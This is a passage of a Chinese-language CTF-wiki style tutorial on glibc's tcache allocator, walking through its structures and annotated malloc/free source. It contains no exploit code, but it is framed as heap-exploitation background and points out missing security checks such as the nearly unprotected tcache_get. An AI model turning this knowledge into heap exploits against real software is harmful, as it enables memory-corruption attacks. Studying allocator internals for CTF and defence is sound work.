data-url=\"aHR0cHM6Ly9zb3VyY2V3YXJlLm9yZy9naXQvP3A9Z2xpYmMuZ2l0O2E9Y29tbWl0ZGlmZjtoPWQ1YzNmYWZjNDMwN2M5YjdhNGM3ZDVjYjM4MWZjZGJmYWQzNDBiY2M=\">commit</span>），目的是提升堆管理的性能。但提升性能的同时舍弃了很多安全检查，也因此有了很多新的利用方式。</p>\n<blockquote>\n<p>主要参考了 glibc 源码，angelboy 的 slide 以及 tukan.farm，链接都放在最后了。</p>\n</blockquote>\n<p>相关结构体 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9pbXBsZW1lbnRhdGlvbi90Y2FjaGUvI18x\">¶</span></p>\n<p>tcache 引入了两个新的结构体， <code>tcache_entry</code>  和  <code>tcache_perthread_struct</code> 。</p>\n<p>这其实和 fastbin 很像，但又不一样。</p>\n<p>tcache_entry<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9pbXBsZW1lbnRhdGlvbi90Y2FjaGUvI3RjYWNoZV9lbnRyeQ==\">¶</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb2RlLndvYm9xLm9yZy91c2Vyc3BhY2UvZ2xpYmMvbWFsbG9jL21hbGxvYy5jLmh0bWwjdGNhY2hlX2VudHJ5\">source code</span></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/* We overlay this structure on the user-data portion of a chunk when</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>   the chunk is stored in the per-thread cache.  */</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">tcache_entry</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">tcache_entry</span> <span class=\"token operator\">*</span>next<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span> tcache_entry<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><code>tcache_entry</code>  用于链接空闲的 chunk 结构体，其中的  <code>next</code>  指针指向下一个大小相同的 chunk。</p>\n<p>需要注意的是这里的 next 指向 chunk 的 user data，而 fastbin 的 fd 指向 chunk 开头的地址。</p>\n<p>而且，tcache_entry 会复用空闲 chunk 的 user data 部分。</p>\n<p>tcache_perthread_struct<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9pbXBsZW1lbnRhdGlvbi90Y2FjaGUvI3RjYWNoZV9wZXJ0aHJlYWRfc3RydWN0\">¶</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb2RlLndvYm9xLm9yZy91c2Vyc3BhY2UvZ2xpYmMvbWFsbG9jL21hbGxvYy5jLmh0bWwjdGNhY2hlX3BlcnRocmVhZF9zdHJ1Y3Q=\">source code</span></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/* There is one of these for each thread, which contains the</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>   per-thread cache (hence \"tcache_perthread_struct\").  Keeping</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>   overall size low is mildly important.  Note that COUNTS and ENTRIES</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>   are redundant (we could have just counted the linked list each</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>   time), this is for performance reasons.  */</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">tcache_perthread_struct</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">char</span> counts<span class=\"token punctuation\">[</span>TCACHE_MAX_BINS<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  tcache_entry <span class=\"token operator\">*</span>entries<span class=\"token punctuation\">[</span>TCACHE_MAX_BINS<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span> tcache_perthread_struct<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">TCACHE_MAX_BINS</span>                <span class=\"token expression\"><span class=\"token number\">64</span></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">static</span> __thread tcache_perthread_struct <span class=\"token operator\">*</span>tcache <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>每个 thread 都会维护一个  <code>tcache_perthread_struct</code> ，它是整个 tcache 的管理结构，一共有  <code>TCACHE_MAX_BINS</code>  个计数器和  <code>TCACHE_MAX_BINS</code>  项 tcache_entry，其中</p>\n<ul>\n<li><code>tcache_entry</code>  用单向链表的方式链接了相同大小的处于空闲状态（free 后）的 chunk，这一点上和 fastbin 很像。</li>\n<li><code>counts</code>  记录了  <code>tcache_entry</code>  链上空闲 chunk 的数目，每条链上最多可以有 7 个 chunk。</li>\n</ul>\n<p>用图表示大概是：</p>\n<p>基本工作方式 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9pbXBsZW1lbnRhdGlvbi90Y2FjaGUvI18y\">¶</span></p>\n<ul>\n<li>第一次 malloc 时，会先 malloc 一块内存用来存放  <code>tcache_perthread_struct</code>  。</li>\n<li>free 内存，且 size 小于 small bin size 时</li>\n<li>tcache 之前会放到 fastbin 或者 unsorted bin 中</li>\n<li>tcache 后：\n<ul>\n<li>先放到对应的 tcache 中，直到 tcache 被填满（默认是 7 个）</li>\n<li>tcache 被填满之后，再次 free 的内存和之前一样被放到 fastbin 或者 unsorted bin 中</li>\n<li>tcache 中的 chunk 不会合并（不取消 inuse bit）</li>\n</ul>\n</li>\n<li>malloc 内存，且 size 在 tcache 范围内</li>\n<li>先从 tcache 取 chunk，直到 tcache 为空</li>\n<li>tcache 为空后，从 bin 中找</li>\n<li>tcache 为空时，如果  <code>fastbin/smallbin/unsorted bin</code>  中有 size 符合的 chunk，会先把  <code>fastbin/smallbin/unsorted bin</code>  中的 chunk 放到 tcache 中，直到填满。之后再从 tcache 中取；因此 chunk 在 bin 中和 tcache 中的顺序会反过来</li>\n</ul>\n<p>源码分析 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9pbXBsZW1lbnRhdGlvbi90Y2FjaGUvI18z\">¶</span></p>\n<p>接下来从源码的角度分析一下 tcache。</p>\n<p>libc_malloc<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9pbXBsZW1lbnRhdGlvbi90Y2FjaGUvI19fbGliY19tYWxsb2M=\">¶</span></p>\n<p>第一次 malloc 时，会进入到  <code>MAYBE_INIT_TCACHE ()</code></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb2RlLndvYm9xLm9yZy91c2Vyc3BhY2UvZ2xpYmMvbWFsbG9jL21hbGxvYy5jLmh0bWwjMzAxMA==\">source code</span></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">__libc_malloc</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span> bytes<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">if</span> <span class=\"token expression\">USE_TCACHE</span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token comment\">/* int_free also calls request2size, be careful to not pad twice.  */</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token class-name\">size_t</span> tbytes<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token comment\">// 根据 malloc 传入的参数计算 chunk 实际大小，并计算 tcache 对应的下标</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">checked_request2size</span> <span class=\"token punctuation\">(</span>bytes<span class=\"token punctuation\">,</span> tbytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token class-name\">size_t</span> tc_idx <span class=\"token operator\">=</span> <span class=\"token function\">csize2tidx</span> <span class=\"token punctuation\">(</span>tbytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token comment\">// 初始化 tcache</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token function\">MAYBE_INIT_TCACHE</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  DIAG_PUSH_NEEDS_COMMENT<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>tc_idx <span class=\"token operator\">&lt;</span> mp_<span class=\"token punctuation\">.</span>tcache_bins  <span class=\"token comment\">// 根据 size 得到的 idx 在合法的范围内</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      <span class=\"token comment\">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class=\"token comment\">/* to appease gcc */</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>      <span class=\"token operator\">&amp;&amp;</span> tcache</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      <span class=\"token operator\">&amp;&amp;</span> tcache<span class=\"token operator\">-></span>entries<span class=\"token punctuation\">[</span>tc_idx<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">//tcache->entries [tc_idx] 有 chunk</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      <span class=\"token keyword\">return</span> <span class=\"token function\">tcache_get</span> <span class=\"token punctuation\">(</span>tc_idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  DIAG_POP_NEEDS_COMMENT<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>tcache_init()<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9pbXBsZW1lbnRhdGlvbi90Y2FjaGUvI19fdGNhY2hlX2luaXQ=\">¶</span></p>\n<p>其中  <code>MAYBE_INIT_TCACHE ()</code>  在 tcache 为空（即第一次 malloc）时调用了  <code>tcache_init()</code> ，直接查看  <code>tcache_init()</code></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb2RlLndvYm9xLm9yZy91c2Vyc3BhY2UvZ2xpYmMvbWFsbG9jL21hbGxvYy5jLmh0bWwjdGNhY2hlX2luaXQ=\">source code</span></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">tcache_init</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  mstate ar_ptr<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>victim <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">const</span> <span class=\"token class-name\">size_t</span> bytes <span class=\"token operator\">=</span> <span class=\"token keyword\">sizeof</span> <span class=\"token punctuation\">(</span>tcache_perthread_struct<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>tcache_shutting_down<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">arena_get</span> <span class=\"token punctuation\">(</span>ar_ptr<span class=\"token punctuation\">,</span> bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 找到可用的 arena</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  victim <span class=\"token operator\">=</span> <span class=\"token function\">_int_malloc</span> <span class=\"token punctuation\">(</span>ar_ptr<span class=\"token punctuation\">,</span> bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 申请一个 sizeof (tcache_perthread_struct) 大小的 chunk</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>victim <span class=\"token operator\">&amp;&amp;</span> ar_ptr <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      ar_ptr <span class=\"token operator\">=</span> <span class=\"token function\">arena_get_retry</span> <span class=\"token punctuation\">(</span>ar_ptr<span class=\"token punctuation\">,</span> bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>      victim <span class=\"token operator\">=</span> <span class=\"token function\">_int_malloc</span> <span class=\"token punctuation\">(</span>ar_ptr<span class=\"token punctuation\">,</span> bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>ar_ptr <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token function\">__libc_lock_unlock</span> <span class=\"token punctuation\">(</span>ar_ptr<span class=\"token operator\">-></span>mutex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token comment\">/* In a low memory situation, we may not be able to allocate memory</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>     - in which case, we just keep trying later.  However, we</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>     typically do this very early, so either there is sufficient</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>     memory, or there isn't enough memory to do non-trivial</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>     allocations anyway.  */</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>victim<span class=\"token punctuation\">)</span> <span class=\"token comment\">// 初始化 tcache</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>      tcache <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>tcache_perthread_struct <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> victim<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>      <span class=\"token function\">memset</span> <span class=\"token punctuation\">(</span>tcache<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span> <span class=\"token punctuation\">(</span>tcache_perthread_struct<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>tcache_init()</code>  成功返回后， <code>tcache_perthread_struct</code>  就被成功建立了。</p>\n<p>申请内存 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9pbXBsZW1lbnRhdGlvbi90Y2FjaGUvI180\">¶</span></p>\n<p>接下来将进入申请内存的步骤</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 从 tcache list 中获取内存</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>tc_idx <span class=\"token operator\">&lt;</span> mp_<span class=\"token punctuation\">.</span>tcache_bins <span class=\"token comment\">// 由 size 计算的 idx 在合法范围内</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>      <span class=\"token comment\">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class=\"token comment\">/* to appease gcc */</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>      <span class=\"token operator\">&amp;&amp;</span> tcache</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>      <span class=\"token operator\">&amp;&amp;</span> tcache<span class=\"token operator\">-></span>entries<span class=\"token punctuation\">[</span>tc_idx<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 该条 tcache 链不为空</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>      <span class=\"token keyword\">return</span> <span class=\"token function\">tcache_get</span> <span class=\"token punctuation\">(</span>tc_idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  DIAG_POP_NEEDS_COMMENT<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token comment\">// 进入与无 tcache 时类似的流程</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>SINGLE_THREAD_P<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      victim <span class=\"token operator\">=</span> <span class=\"token function\">_int_malloc</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>main_arena<span class=\"token punctuation\">,</span> bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>      <span class=\"token function\">assert</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>victim <span class=\"token operator\">||</span> <span class=\"token function\">chunk_is_mmapped</span> <span class=\"token punctuation\">(</span><span class=\"token function\">mem2chunk</span> <span class=\"token punctuation\">(</span>victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>              <span class=\"token operator\">&amp;</span>main_arena <span class=\"token operator\">==</span> <span class=\"token function\">arena_for_chunk</span> <span class=\"token punctuation\">(</span><span class=\"token function\">mem2chunk</span> <span class=\"token punctuation\">(</span>victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      <span class=\"token keyword\">return</span> victim<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>在  <code>tcache-&gt;entries</code>  不为空时，将进入  <code>tcache_get()</code>  的流程获取 chunk，否则与 tcache 机制前的流程类似，这里主要分析第一种  <code>tcache_get()</code> 。这里也可以看出 tcache 的优先级很高，比 fastbin 还要高（ fastbin 的申请在没进入 tcache 的流程中）。</p>\n<p>tcache_get()<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9pbXBsZW1lbnRhdGlvbi90Y2FjaGUvI3RjYWNoZV9nZXQ=\">¶</span></p>\n<p>看一下  <code>tcache_get()</code></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb2RlLndvYm9xLm9yZy91c2Vyc3BhY2UvZ2xpYmMvbWFsbG9jL21hbGxvYy5jLmh0bWwjdGNhY2hlX2dldA==\">source code</span></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/* Caller must ensure that we know tc_idx is valid and there's</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>   available chunks to remove.  */</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">static</span> __always_inline <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">tcache_get</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span> tc_idx<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  tcache_entry <span class=\"token operator\">*</span>e <span class=\"token operator\">=</span> tcache<span class=\"token operator\">-></span>entries<span class=\"token punctuation\">[</span>tc_idx<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">assert</span> <span class=\"token punctuation\">(</span>tc_idx <span class=\"token operator\">&lt;</span> TCACHE_MAX_BINS<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">assert</span> <span class=\"token punctuation\">(</span>tcache<span class=\"token operator\">-></span>entries<span class=\"token punctuation\">[</span>tc_idx<span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  tcache<span class=\"token operator\">-></span>entries<span class=\"token punctuation\">[</span>tc_idx<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> e<span class=\"token operator\">-></span>next<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token operator\">--</span><span class=\"token punctuation\">(</span>tcache<span class=\"token operator\">-></span>counts<span class=\"token punctuation\">[</span>tc_idx<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 获得一个 chunk，counts 减一</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> e<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>tcache_get()</code>  就是获得 chunk 的过程了。可以看出这个过程还是很简单的，从  <code>tcache-&gt;entries[tc_idx]</code>  中获得第一个 chunk， <code>tcache-&gt;counts</code>  减一，几乎没有任何保护。</p>\n<p>libc_free()<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9pbXBsZW1lbnRhdGlvbi90Y2FjaGUvI19fbGliY19mcmVl\">¶</span></p>\n<p>看完申请，再看看有 tcache 时的释放</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb2RlLndvYm9xLm9yZy91c2Vyc3BhY2UvZ2xpYmMvbWFsbG9jL21hbGxvYy5jLmh0bWwjMzA2OA==\">source code</span></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">__libc_free</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>mem<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">MAYBE_INIT_TCACHE</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  ar_ptr <span class=\"token operator\">=</span> <span class=\"token function\">arena_for_chunk</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">_int_free</span> <span class=\"token punctuation\">(</span>ar_ptr<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>__libc_free()</code>  没有太多变化， <code>MAYBE_INIT_TCACHE ()</code>  在 tcache 不为空失去了作用。</p>\n<p>int_free()<span class=\"exturl\" 